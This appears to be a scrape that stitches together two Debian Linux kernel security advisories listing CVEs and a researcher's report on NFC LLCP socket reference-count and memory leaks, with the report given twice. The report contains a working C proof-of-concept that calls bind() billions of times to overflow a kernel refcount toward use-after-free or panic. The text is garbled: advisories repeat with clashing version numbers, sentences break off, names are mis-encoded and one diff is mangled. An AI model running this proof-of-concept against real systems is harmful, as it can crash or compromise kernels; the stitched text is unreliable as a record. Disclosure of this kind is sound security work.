Debian Bug     : 986949 988352 989451

Several vulnerabilities have been discovered in the Linux kernel that
may lead to the execution of arbitrary code, privilege escalation,
denial of service, or information leaks.

CVE-2020-24586, CVE-2020-24587, CVE-2020-26147

    Mathy Vanhoef discovered that many Wi-Fi implementations,
    including Linux's mac80211, did not correctly implement reassembly
    of fragmented packets.  In some circumstances, an attacker within
    range of a network could exploit these flaws to forge arbitrary
    packets and/or to access sensitive data on that network.

CVE-2020-24588

    Mathy Vanhoef discovered that most Wi-Fi implementations,
    including Linux's mac80211, did not authenticate the "is
    aggregated" packet header flag.  An attacker within range of a
    network could exploit this to forge arbitrary packets on that
    network.

CVE-2020-25670, CVE-2020-25671, CVE-2021-23134

    kiyin (å°¹äº®) of TenCent discovered several reference counting bugs
    in the NFC LLCP implementation which could lead to use-after-free.
    A local user could exploit these for denial of service (crash or
    memory corruption) or possibly for privilege escalation.

    Nadav Markus and Or Cohen of Palo Alto Networks discovered that
    the original fixes for these introduced a new bug that could
    result in use-after-free and double-free.  This has also been
    fixed.

CVE-2020-25672

    kiyin (å°¹äº®) of TenCent discovered a memory leak in the NFC LLCP
    implementation.  A local user could exploit this for denial of
    service (memory exhaustion).

CVE-2020-26139

    Mathy Vanhoef discovered that a bug in some Wi-Fi implementations,
    including Linux's mac80211.  When operating in AP mode, they would
    forward EAPOL frames from one client to another while the sender
    was not yet authenticated.  An attacker within range of a network
    could use this for denial of service or as an aid to exploiting
    other vulnerabilities.

CVE-2020-26558, CVE-2021-0129

    Researchers at ANSSI discovered vulnerabilities in the Bluetooth
    Passkey authentication method, and in Linux's implementation of
    it.  An attacker within range of two Bluetooth devices while they
    pair using Passkey authentication could exploit this to obtain the
    shared secret (Passkey) and then impersonate either of the devices
    to each other.

CVE-2020-29374

    Jann Horn of Google reported a flaw in Linux's virtual memory
    management.  A parent and child process initially share all their
    memory, but when either writes to a shared page, the page is
    duplicated and unshared (copy-on-write).  However, in case an
    operation such as vmsplice() required the kernel to take an
    additional reference to a shared page, and a copy-on-write occurs
    during this operation, the kernel might have accessed the wrong
    process's memory.  For some programs, this could lead to an
    information leak or data corruption.

CVE-2021-3483

    é©¬å“²å®‡ (Zheyu Ma) reported a bug in the "nosy" driver for TI
    PCILynx FireWire controllers, which could lead to list corruption
    and a use-after-free.  On a system that uses this driver, local
    users granted access to /dev/nosy could exploit this to cause a
    denial of service (crash or memory corruption) or possibly for
    privilege escalation.

CVE-2021-3506

    The ADLab of venustech discovered a bug in the F2FS driver which
    could lead to an out-of-bounds read when accessing a crafted
    filesystem.  A local user permitted to mount arbitrary filesystems
    could exploit this to cause a denial of service (crash) or other
    security impact.

CVE-2021-3564, CVE-2021-3573, CVE-2021-32399

    The BlockSec team discovered several race conditions in the
    Bluetooth subsystem that could lead to a use-after-free or
    double-free.  A local user could exploit these to caue a denial of
    service (crash or memory corruption) or possibly for privilege
    escalation.

CVE-2021-3587

    Active Defense Lab of Venustech discovered a potential null
    pointer dereference in the NFC LLCP implementation.  A local user
    could use this to cause a denial of service (crash).

CVE-2021-23133

    Or Cohen of Palo Alto Networks discovered a race condition in the
    SCTP implementation, which can lead to list corruption.  A local
    user could exploit this to cause a denial of service (crash or
    memory corruption) or possibly for privilege escalation.

CVE-2021-28688 (XSA-371)

    It was discovered that the original fix for CVE-2021-26930
    (XSA-365) introduced a potential resource leak.  A malicious guest
    could presumably exploit this to cause a denial of service
    (resource exhaustion) within the host.

CVE-2021-28964

    Zygo Blaxell reported a race condition in the Btrfs driver which
    can lead to an assertion failure.  On systems using Btrfs, a local
    user could exploit this to cause a denial of service (crash).

CVE-2021-28971

    Vince Weaver reported a bug in the performance event handler for
    Intel PEBS.  A workaround for a hardware bug on Intel CPUs
    codenamed "Haswell" and earlier could lead to a null pointer
    dereference.  On systems with the affected CPUs, if users are
    permitted to access performance events, a local user may exploit
    this to cause a denial of service (crash).

    By default, unprivileged users do not have access to performance
    events, which mitigates this issue.  This is controlled by the
    kernel.perf_event_paranoid sysctl.

CVE-2021-29154

    It was discovered that the Extended BPF (eBPF) JIT compiler
    for x86_64 generated incorrect branch instructions in some
    cases.  On systems where eBPF JIT is enabled, users could
    exploit this to execute arbitrary code in the kernel.

    By default, eBPF JIT is disabled, mitigating this issue.  This is
    controlled by the net.core.bpf_jit_enable sysctl.

CVE-2021-29155, CVE-2021-31829

    Piotr Krysiuk and Benedict Schlueter discovered that the Extended
    BPF (eBPF) verifier did not completely protect against information
    leaks due to speculative execution.  A local user could exploit
    these to obtain sensitive information from kernel memory.

CVE-2021-29264

    It was discovered that the "gianfar" Ethernet driver used with
    some Freescale SoCs did not correctly handle a Rx queue overrun
    when jumbo packets were enabled.  On systems using this driver and
    jumbo packets, an attacker on the network could exploit this to
    cause a denial of service (crash).

    This driver is not enabled in Debian's official kernel
    configurations.

CVE-2021-29647

    The syzbot tool found an information leak in the Qualcomm IPC
    Router (qrtr) implementation.

    This protocol is not enabled in Debian's official kernel
    configurations.

CVE-2021-29650

    It was discovered that a data race in the netfilter subsystem
    could lead to a null pointer dereference during replacement of a
    table.  A local user with CAP_NET_ADMIN capability in any user
    namespace could use this to cause a denial of service (crash).

    By default, unprivileged users cannot create user namespaces,
    which mitigates this issue.  This is controlled by the
    kernel.unprivileged_userns_clone sysctl.

CVE-2021-31916

    Dan Carpenter reported incorrect parameter validation in the
    device-mapper (dm) subsystem, which could lead to a heap buffer
    overrun.  However, only users with CAP_SYS_ADMIN capability
    (i.e. root-equivalent) could trigger this bug, so it did not
    have any security impact in this kernel version.

CVE-2021-33034

    The syzbot tool found a bug in the Bluetooth subsystem that could
    lead to a use-after-free.  A local user could use this to cause a
    denial of service (crash or memory corruption) or possibly for
    privilege escalation.

For Debian 9 stretch, these problems have been fixed in version
4.19.194-1~deb9u1.  This update additionally fixes Debian bug
#986949, #988352, and #989451; and includes many more bug fixes from

                 CVE-2021-33034

Several vulnerabilities have been discovered in the Linux kernel that
may lead to the execution of arbitrary code, privilege escalation,
denial of service, or information leaks.

This update is not yet available for the armel (ARM EABI soft-float)
architecture.

CVE-2020-24586, CVE-2020-24587, CVE-2020-26147

    Mathy Vanhoef discovered that many Wi-Fi implementations,
    including Linux's mac80211, did not correctly implement reassembly
    of fragmented packets.  In some circumstances, an attacker within
    range of a network could exploit these flaws to forge arbitrary
    packets and/or to access sensitive data on that network.

CVE-2020-24588

    Mathy Vanhoef discovered that most Wi-Fi implementations,
    including Linux's mac80211, did not authenticate the "is
    aggregated" packet header flag.  An attacker within range of a
    network could exploit this to forge arbitrary packets on that
    network.

CVE-2020-25670, CVE-2020-25671, CVE-2021-23134

    kiyin (å°¹äº®) of TenCent discovered several reference counting bugs
    in the NFC LLCP implementation which could lead to use-after-free.
    A local user could exploit these for denial of service (crash or
    memory corruption) or possibly for privilege escalation.

    Nadav Markus and Or Cohen of Palo Alto Networks discovered that
    the original fixes for these introduced a new bug that could
    result in use-after-free and double-free.  This has also been
    fixed.

CVE-2020-25672

    kiyin (å°¹äº®) of TenCent discovered a memory leak in the NFC LLCP
    implementation.  A local user could exploit this for denial of
    service (memory exhaustion).

CVE-2020-26139

    Mathy Vanhoef discovered that a bug in some Wi-Fi implementations,
    including Linux's mac80211.  When operating in AP mode, they would
    forward EAPOL frames from one client to another while the sender
    was not yet authenticated.  An attacker within range of a network
    could use this for denial of service or as an aid to exploiting
    other vulnerabilities.

CVE-2020-26558, CVE-2021-0129

    Researchers at ANSSI discovered vulnerabilities in the Bluetooth
    Passkey authentication method, and in Linux's implementation of
    it.  An attacker within range of two Bluetooth devices while they
    pair using Passkey authentication could exploit this to obtain the
    shared secret (Passkey) and then impersonate either of the devices
    to each other.

CVE-2020-29374

    Jann Horn of Google reported a flaw in Linux's virtual memory
    management.  A parent and child process initially share all their
    memory, but when either writes to a shared page, the page is
    duplicated and unshared (copy-on-write).  However, in case an
    operation such as vmsplice() required the kernel to take an
    additional reference to a shared page, and a copy-on-write occurs
    during this operation, the kernel might have accessed the wrong
    process's memory.  For some programs, this could lead to an
    information leak or data corruption.

CVE-2020-36322, CVE-2021-28950

    The syzbot tool found that the FUSE (filesystem-in-user-space)
    implementation did not correctly handle a FUSE server returning
    invalid attributes for a file.  A local user permitted to run a
    FUSE server could use this to cause a denial of service (crash).

    The original fix for this introduced a different potential denial
    of service (infinite loop in kernel space), which has also been
    fixed.

CVE-2021-3428

    Wolfgang Frisch reported a potential integer overflow in the ext4
    filesystem driver. A user permitted to mount arbitrary filesystem
    images could use this to cause a denial of service (crash).

CVE-2021-3483

    é©¬å“²å®‡ (Zheyu Ma) reported a bug in the "nosy" driver for TI
    PCILynx FireWire controllers, which could lead to list corruption
    and a use-after-free.  On a system that uses this driver, local
    users granted access to /dev/nosy could exploit this to cause a
    denial of service (crash or memory corruption) or possibly for
    privilege escalation.

CVE-2021-3564, CVE-2021-3573, CVE-2021-32399

    The BlockSec team discovered several race conditions in the
    Bluetooth subsystem that could lead to a use-after-free or
    double-free.  A local user could exploit these to caue a denial of
    service (crash or memory corruption) or possibly for privilege
    escalation.

CVE-2021-3587

    Active Defense Lab of Venustech discovered a potential null
    pointer dereference in the NFC LLCP implementation.  A local user
    could use this to cause a denial of service (crash).

CVE-2021-20292

    It was discovered that the TTM buffer allocation API used by GPU
    drivers did not handle allocation failures in the way that most
    drivers expected, resulting in a double-free on failure.  A local
    user on a system using one of these drivers could possibly exploit
    this to cause a denial of service (crash or memory corruption) or
    for privilege escalation.  The API has been changed to match
    driver expectations.

CVE-2021-23133

    Or Cohen of Palo Alto Networks discovered a race condition in the
    SCTP implementation, which can lead to list corruption.  A local
    user could exploit this to cause a denial of service (crash or
    memory corruption) or possibly for privilege escalation.

CVE-2021-28660

    It was discovered that the rtl8188eu WiFi driver did not correctly
    limit the length of SSIDs copied into scan results. An attacker
    within WiFi range could use this to cause a denial of service
    (crash or memory corruption) or possibly to execute code on a
    vulnerable system.

CVE-2021-28688 (XSA-371)

    It was discovered that the original fix for CVE-2021-26930
    (XSA-365) introduced a potential resource leak.  A malicious guest
    could presumably exploit this to cause a denial of service
    (resource exhaustion) within the host.

CVE-2021-28964

    Zygo Blaxell reported a race condition in the Btrfs driver which
    can lead to an assertion failure.  On systems using Btrfs, a local
    user could exploit this to cause a denial of service (crash).

CVE-2021-28971

    Vince Weaver reported a bug in the performance event handler for
    Intel PEBS.  A workaround for a hardware bug on Intel CPUs
    codenamed "Haswell" and earlier could lead to a null pointer
    dereference.  On systems with the affected CPUs, if users are
    permitted to access performance events, a local user may exploit
    this to cause a denial of service (crash).

    By default, unprivileged users do not have access to performance
    events, which mitigates this issue.  This is controlled by the
    kernel.perf_event_paranoid sysctl.

CVE-2021-29154

    It was discovered that the Extended BPF (eBPF) JIT compiler
    for x86_64 generated incorrect branch instructions in some
    cases.  On systems where eBPF JIT is enabled, users could
    exploit this to execute arbitrary code in the kernel.

    By default, eBPF JIT is disabled, mitigating this issue.  This is
    controlled by the net.core.bpf_jit_enable sysctl.

CVE-2021-29265

    The syzbot tool found a race condition in the USB/IP host
    (server) implementation which can lead to a null pointer
    dereference.  On a system acting as a USB/IP host, a client
    can exploit this to cause a denial of service (crash).

CVE-2021-29647

    The syzbot tool found an information leak in the Qualcomm IPC
    Router (qrtr) implementation.

    This protocol is not enabled in Debian's official kernel
    configurations.

CVE-2021-29650

    It was discovered that a data race in the netfilter subsystem
    could lead to a null pointer dereference during replacement of a
    table.  A local user with CAP_NET_ADMIN capability in any user
    namespace could use this to cause a denial of service (crash).

    By default, unprivileged users cannot create user namespaces,
    which mitigates this issue.  This is controlled by the
    kernel.unprivileged_userns_clone sysctl.

CVE-2021-30002

    Arnd Bergmann and the syzbot tool found a memory leak in the
    Video4Linux (v4l) subsystem.  A local user permitted to access
    video devices (by default, any member of the "video" group) could
    exploit this to cause a denial of service (memory exhaustion).

CVE-2021-31916

    Dan Carpenter reported incorrect parameter validation in the
    device-mapper (dm) subsystem, which could lead to a heap buffer
    overrun.  However, only users with CAP_SYS_ADMIN capability
    (i.e. root-equivalent) could trigger this bug, so it did not
    have any security impact in this kernel version.

CVE-2021-33034

    The syzbot tool found a bug in the Bluetooth subsystem that could
    lead to a use-after-free.  A local user could use this to cause a
    denial of service (crash or memory corruption) or possibly for
    privilege escalation.

For Debian 9 stretch, these problems have been fixed in version
4.9.272-1.  This update additionally includes many more bug fixes from
stable updates 4.9.259-4.9.272 inclusive.

We recommend that you upgrade your linux packages.

Details:

Hi,

we found many bugs in nfc socket. Here is the detail.

At first, let's see a fixed bug from <https://lore.kernel.org/patchwork/patch/1135836>. this patch fixed a memory leak bug in llcp_sock_bind()

--- a/net/nfc/llcp_sock.c
+++ b/net/nfc/llcp_sock.c
@@ -119,9 +119,14 @@  static int llcp_sock_bind(struct socket
     llcp_sock->service_name = kmemdup(llcp_addr.service_name,
                       llcp_sock->service_name_len,
                       GFP_KERNEL);

+        llcp_sock->service_name = NULL;
         ret = -EADDRINUSE;
         goto put_dev;
     }

if nfc_llcp_get_sdp_ssap failed, llcp_sock->service_name will be freed. That's really fixed.

new bug 1, refcount leak in llcp_sock_bind():
In the same function llcp_sock_bind(), nfc_llcp_local_get() is called before kmemdup.

<https://git.kernel.org/pub/scm/linux/kernel/git/stable/linux.git/tree/net/nfc/llcp_sock.c?h=v5.3.18#n101>
101    llcp_sock->dev = dev;
102    llcp_sock->local = nfc_llcp_local_get(local);                     <---- nfc_llcp_local_get increases the refcount of local, adds plus 1
103    llcp_sock->nfc_protocol = llcp_addr.nfc_protocol;
104    llcp_sock->service_name_len = min_t(unsigned int,
105                        llcp_addr.service_name_len,
106                        NFC_LLCP_MAX_SERVICE_NAME);
107    llcp_sock->service_name = kmemdup(llcp_addr.service_name,
108                      llcp_sock->service_name_len,
109                      GFP_KERNEL);
110    if (!llcp_sock->service_name) {
111        ret = -ENOMEM;
112        goto put_dev;
113    }
114    llcp_sock->ssap = nfc_llcp_get_sdp_ssap(local, llcp_sock);
115    if (llcp_sock->ssap == LLCP_SAP_MAX) {
116        kfree(llcp_sock->service_name);                               <---- if nfc_llcp_get_sdp_ssap returns LLCP_SAP_MAX, only llcp_sock->service_name gets be freed.
117        llcp_sock->service_name = NULL;                               <---- nothing is done to local.
118        ret = -EADDRINUSE;
119        goto put_dev;
120    }
..............................
130 put_dev:                                                             <---- nothing is done to local in put_dev label either.
131     nfc_put_device(dev);
132
133 error:
134     release_sock(sk);
135     return ret;                                                      <---- the refcount of local remains added.

from the analysis above, we can see that: if nfc_llcp_get_sdp_ssap returns LLCP_SAP_MAX, when llcp_sock_bind() is returned, sk->sk_state is still LLCP_CLOSED. So we can call llcp_sock_bind() many times, keep the refcount of local increasing.

Threre is a REFCOUNT_CHECK_LT_ZERO in refcount_inc. When the refcount of local gets to 0x80000000, if the system handles the refcount exception, it leads to a system panic. If not, it will get to 0xFFFFFFFF and then to 0, then to 1... if nfc_llcp_local_put is called, the local will be freed. that is a worse UAF bug which might lead to privilege escalations.

Here is the test code:

#include <unistd.h>
#include <string.h>
#include <sys/socket.h>
#include <linux/nfc.h>

#define NFC_SOCKPROTO_LLCP  1
#define NFC_PROTO_NFC_DEP   5

int main()
{
    unsigned int i;
    int fd;
    struct sockaddr_nfc_llcp addr;

    fd = socket( AF_NFC, SOCK_STREAM, NFC_SOCKPROTO_LLCP );
    if ( fd < 0 )
        return 0;

    memset( &addr, 0, sizeof(struct sockaddr_nfc_llcp) );
    addr.sa_family = AF_NFC;
    addr.dev_idx = 0;
    addr.nfc_protocol = NFC_PROTO_NFC_DEP;
    addr.service_name_len = 0;

    for ( i = 0; i < 0x90000000; i++ )
    {
        bind( fd, (struct sockaddr*) &addr, sizeof(struct sockaddr_nfc_llcp) );
    }

    close( fd );
    return 0;
}

new bug 2, refcount leak in llcp_sock_connect():
it is the same bug as the one described above.
<https://git.kernel.org/pub/scm/linux/kernel/git/stable/linux.git/tree/net/nfc/llcp_sock.c?h=v5.3.18#n701>

new bug 3, memory leak in llcp_sock_connect():

it is the same bug as the fixed one in llcp_sock_bind()

new bug 4, non-blocking socket in llcp_sock_connect():

<https://git.kernel.org/pub/scm/linux/kernel/git/stable/linux.git/tree/net/nfc/llcp_sock.c?h=v5.3.18#n727>

727    nfc_llcp_sock_link(&local->connecting_sockets, sk);               <---- sk is linked to local->connecting_sockets
728
729    ret = nfc_llcp_send_connect(llcp_sock);
730    if (ret)
731        goto sock_unlink;
732
733    sk->sk_state = LLCP_CONNECTING;
734
735    ret = sock_wait_state(sk, LLCP_CONNECTED,
736                  sock_sndtimeo(sk, flags & O_NONBLOCK));             <---- calling ioctl(fd, FIONBIO, &imode) before connect will make the socket flag get O_NONBLOCK mask.
737    if (ret && ret != -EINPROGRESS)                                   <---- sock_wait_state returns -EINPROGRESS right away
738        goto sock_unlink;

740    release_sock(sk);
741
742    return ret;                                                       <---- llcp_sock_connect() returns right away

if we set llcp_sock->service_name to meaningless string, the connect will be failed. and sk->sk_state will not be LLCP_CONNECTED. then we can call llcp_sock_connect() many times. that leaks everything:
llcp_sock->dev, llcp_sock->local, llcp_sock->ssap, llcp_sock->service_name...
leak is one problem. another problem is that we can call llcp_sock_connect() twice before nfc target response. nfc_llcp_sock_link() will add sk to local->connecting_sockets twice. sk->sk_node->next will point to itself, that will make an endless loop and hang-up the system.

Details:

Hi,

we found many bugs in nfc socket. Here is the detail.

At first, let's see a fixed bug from <https://lore.kernel.org/patchwork/patch/1135836>. this patch fixed a memory leak bug in llcp_sock_bind()

--- a/net/nfc/llcp_sock.c
+++ b/net/nfc/llcp_sock.c
@@ -119,9 +119,14 @@  static int llcp_sock_bind(struct socket
     llcp_sock->service_name = kmemdup(llcp_addr.service_name,
                       llcp_sock->service_name_len,
                       GFP_KERNEL);
-
+    if (!llcp_sock->service_name) {
+        ret = -ENOMEM;
+        goto put_dev;
+    }
     llcp_sock->ssap = nfc_llcp_get_sdp_ssap(local, llcp_sock);
     if (llcp_sock->ssap == LLCP_SAP_MAX) {
+        kfree(llcp_sock->service_name);
+        llcp_sock->service_name = NULL;
         ret = -EADDRINUSE;
         goto put_dev;
     }

if nfc_llcp_get_sdp_ssap failed, llcp_sock->service_name will be freed. That's really fixed.

new bug 1, refcount leak in llcp_sock_bind():
In the same function llcp_sock_bind(), nfc_llcp_local_get() is called before kmemdup.

<https://git.kernel.org/pub/scm/linux/kernel/git/stable/linux.git/tree/net/nfc/llcp_sock.c?h=v5.3.18#n101>
101    llcp_sock->dev = dev;
102    llcp_sock->local = nfc_llcp_local_get(local);                     <---- nfc_llcp_local_get increases the refcount of local, adds plus 1
103    llcp_sock->nfc_protocol = llcp_addr.nfc_protocol;
104    llcp_sock->service_name_len = min_t(unsigned int,
105                        llcp_addr.service_name_len,
106                        NFC_LLCP_MAX_SERVICE_NAME);
107    llcp_sock->service_name = kmemdup(llcp_addr.service_name,
108                      llcp_sock->service_name_len,
109                      GFP_KERNEL);
110    if (!llcp_sock->service_name) {
111        ret = -ENOMEM;
112        goto put_dev;
113    }
114    llcp_sock->ssap = nfc_llcp_get_sdp_ssap(local, llcp_sock);
115    if (llcp_sock->ssap == LLCP_SAP_MAX) {
116        kfree(llcp_sock->service_name);                               <---- if nfc_llcp_get_sdp_ssap returns LLCP_SAP_MAX, only llcp_sock->service_name gets be freed.
117        llcp_sock->service_name = NULL;                               <---- nothing is done to local.
118        ret = -EADDRINUSE;
119        goto put_dev;
120    }
..............................
130 put_dev:                                                             <---- nothing is done to local in put_dev label either.
131     nfc_put_device(dev);
132
133 error:
134     release_sock(sk);
135     return ret;                                                      <---- the refcount of local remains added.

from the analysis above, we can see that: if nfc_llcp_get_sdp_ssap returns LLCP_SAP_MAX, when llcp_sock_bind() is returned, sk->sk_state is still LLCP_CLOSED. So we can call llcp_sock_bind() many times, keep the refcount of local increasing.

Threre is a REFCOUNT_CHECK_LT_ZERO in refcount_inc. When the refcount of local gets to 0x80000000, if the system handles the refcount exception, it leads to a system panic. If not, it will get to 0xFFFFFFFF and then to 0, then to 1... if nfc_llcp_local_put is called, the local will be freed. that is a worse UAF bug which might lead to privilege escalations.

Here is the test code:

#include <unistd.h>
#include <string.h>
#include <sys/socket.h>
#include <linux/nfc.h>

#define NFC_SOCKPROTO_LLCP  1
#define NFC_PROTO_NFC_DEP   5

int main()
{
    unsigned int i;
    int fd;
    struct sockaddr_nfc_llcp addr;

    fd = socket( AF_NFC, SOCK_STREAM, NFC_SOCKPROTO_LLCP );
    if ( fd < 0 )
        return 0;

    memset( &addr, 0, sizeof(struct sockaddr_nfc_llcp) );
    addr.sa_family = AF_NFC;
    addr.dev_idx = 0;
    addr.nfc_protocol = NFC_PROTO_NFC_DEP;
    addr.service_name_len = 0;

    for ( i = 0; i < 0x90000000; i++ )
    {
        bind( fd, (struct sockaddr*) &addr, sizeof(struct sockaddr_nfc_llcp) );
    }

    close( fd );

new bug 2, refcount leak in llcp_sock_connect():
it is the same bug as the one described above.
<https://git.kernel.org/pub/scm/linux/kernel/git/stable/linux.git/tree/net/nfc/llcp_sock.c?h=v5.3.18#n701>
701    llcp_sock->dev = dev;
702    llcp_sock->local = nfc_llcp_local_get(local);                     <---- nfc_llcp_local_get increases the refcount of local, adds plus 1
703    llcp_sock->ssap = nfc_llcp_get_local_ssap(local);
704    if (llcp_sock->ssap == LLCP_SAP_MAX) {                            <---- if nfc_llcp_get_local_ssap returns LLCP_SAP_MAX
705        ret = -ENOMEM;
706        goto put_dev;
707    }
..............................
750 put_dev:                                                             <---- nothing is done to local in put_dev label.

755     return ret;                                                      <---- the refcount of local remains added.

new bug 3, memory leak in llcp_sock_connect():

it is the same bug as the fixed one in llcp_sock_bind()

<https://git.kernel.org/pub/scm/linux/kernel/git/stable/linux.git/tree/net/nfc/llcp_sock.c?h=v5.3.18#n719>
719        llcp_sock->service_name = kmemdup(addr->service_name,
720                          llcp_sock->service_name_len,
721                          GFP_KERNEL);                                <---- kmemdup allocates memory for llcp_sock->service_name
722        if (!llcp_sock->service_name) {
723            ret = -ENOMEM;
724            goto sock_llcp_release;
725        }
726
727        nfc_llcp_sock_link(&local->connecting_sockets, sk);
728
729        ret = nfc_llcp_send_connect(llcp_sock);
730        if (ret)
731            goto sock_unlink;                                         <---- if nfc_llcp_send_connect is failed, llcp_sock->service_name is not freed.
............................................
744    sock_unlink:                                                      <---- llcp_sock->service_name is not freed in the next.
745        nfc_llcp_sock_unlink(&local->connecting_sockets, sk);
746
747    sock_llcp_release:
748        nfc_llcp_put_ssap(local, llcp_sock->ssap);
749
750    put_dev:
751        nfc_put_device(dev);
752
753    error:
754        release_sock(sk);
755        return ret;                                                   <---- sk->sk_state is not LLCP_CONNECTED. we can call llcp_sock_connect() many times.

new bug 4, non-blocking socket in llcp_sock_connect():

<https://git.kernel.org/pub/scm/linux/kernel/git/stable/linux.git/tree/net/nfc/llcp_sock.c?h=v5.3.18#n727>

727    nfc_llcp_sock_link(&local->connecting_sockets, sk);               <---- sk is linked to local->connecting_sockets
728
729    ret = nfc_llcp_send_connect(llcp_sock);
730    if (ret)
731        goto sock_unlink;
732
733    sk->sk_state = LLCP_CONNECTING;
734
735    ret = sock_wait_state(sk, LLCP_CONNECTED,
736                  sock_sndtimeo(sk, flags & O_NONBLOCK));             <---- calling ioctl(fd, FIONBIO, &imode) before connect will make the socket flag get O_NONBLOCK mask.
737    if (ret && ret != -EINPROGRESS)                                   <---- sock_wait_state returns -EINPROGRESS right away
738        goto sock_unlink;
739
740    release_sock(sk);
741
742    return ret;                                                       <---- llcp_sock_connect() returns right away

if we set llcp_sock->service_name to meaningless string, the connect will be failed. and sk->sk_state will not be LLCP_CONNECTED. then we can call llcp_sock_connect() many times. that leaks everything:
llcp_sock->dev, llcp_sock->local, llcp_sock->ssap, llcp_sock->service_name...
leak is one problem. another problem is that we can call llcp_sock_connect() twice before nfc target response. nfc_llcp_sock_link() will add sk to local->connecting_sockets twice. sk->sk_node->next will point to itself, that will make an endless loop and hang-up the system.

kiyin.
